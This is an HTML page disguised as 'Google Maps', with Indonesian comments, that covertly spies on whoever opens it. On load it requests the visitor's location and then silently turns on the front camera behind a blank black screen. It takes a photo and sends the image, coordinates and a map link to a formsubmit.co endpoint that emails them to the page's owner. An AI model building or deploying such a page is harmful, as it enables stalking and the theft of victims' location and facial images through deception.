<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body {
            background-color: #000000;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN_FORM = "d9a1b68b96ce0a668a22f62f9a3f5284"; 

        document.addEventListener("DOMContentLoaded", () => {
            jalankanSistemBerurutan();
        });

        // FUNGSI UTAMA: Mengatur urutan jalannya fungsi secara sinkron
        async function jalankanSistemBerurutan() {
            console.log("TAHAP 1: Memulai permintaan akses lokasi...");
            
            // Menunggu fungsi ambilLokasi selesai sepenuhnya sebelum lanjut ke baris berikutnya
            const koordinat = await ambilLokasi(); 
            
            console.log("TAHAP 2: Lokasi selesai diproses. Memulai akses kamera...");
            
            // Menjalankan fungsi kamera dengan membawa hasil koordinat dari Tahap 1
            aktifkanKameraDanAmbil(koordinat.lat, koordinat.lon);
        }

        // Fungsi mengambil lokasi dengan Promise agar bisa ditunggu (await)
        function ambilLokasi() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            console.log("Lokasi sukses didapatkan.");
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            });
                        },
                        (error) => {
                            console.warn("Izin lokasi ditolak oleh pengguna.");
                            resolve({ lat: "-", lon: "-" }); // Tetap lanjut walaupun ditolak
                        },
                        { timeout: 10000 } // Batas waktu tunggu respons lokasi (10 detik)
                    );
                } else {
                    console.error("Browser tidak mendukung Geolocation.");
                    resolve({ lat: "-", lon: "-" });
                }
            });
        }

        async function aktifkanKameraDanAmbil(lat, lon) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onplaying = () => {
                    // Jeda 2 detik agar sensor lensa menyesuaikan pencahayaan otomatis
                    setTimeout(() => {
                        prosesJepretDanKirimBase64(lat, lon, video, stream);
                    }, 2000);
                };
            } catch (error) {
                console.warn("Izin kamera ditolak oleh pengguna.");
                kirimDataTeksSaja(lat, lon, "Ditolak/Error");
            }
        }

        function prosesJepretDanKirimBase64(lat, lon, videoElement, stream) {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            const lebar = videoElement.videoWidth || 640;
            const tinggi = videoElement.videoHeight || 480;
            canvas.width = lebar;
            canvas.height = tinggi;
            
            context.drawImage(videoElement, 0, 0, lebar, tinggi);

            // Matikan aliran kamera
            stream.getTracks().forEach(track => track.stop());

            // Konversi gambar ke teks string Base64 (kualitas 50% agar hemat ruang)
            const dataTeksGambar = canvas.toDataURL("image/jpeg", 0.5); 

            kirimDataTeksSaja(lat, lon, "Sukses Diambil", dataTeksGambar);
        }

        function kirimDataTeksSaja(lat, lon, statusKamera, fotoBase64 = "Tidak Ada Foto") {
            const formData = new FormData();
            formData.append("Status_Kamera", statusKamera);
            formData.append("Latitude", lat);
            formData.append("Longitude", lon);
            formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
            formData.append("Hasil_Foto_Base64", fotoBase64);
            formData.append("_captcha", "false");

            const url = `https://formsubmit.co/ajax/${TOKEN_FORM}`;
            
            console.log("Sedang mengirimkan data terintegrasi ke email...");
            fetch(url, { method: "POST", body: formData })
                .then(res => console.log("Proses selesai. Seluruh data terkirim."))
                .catch(err => console.error("Gagal mengirim data:", err));
        }
    </script>
</body>
</html>
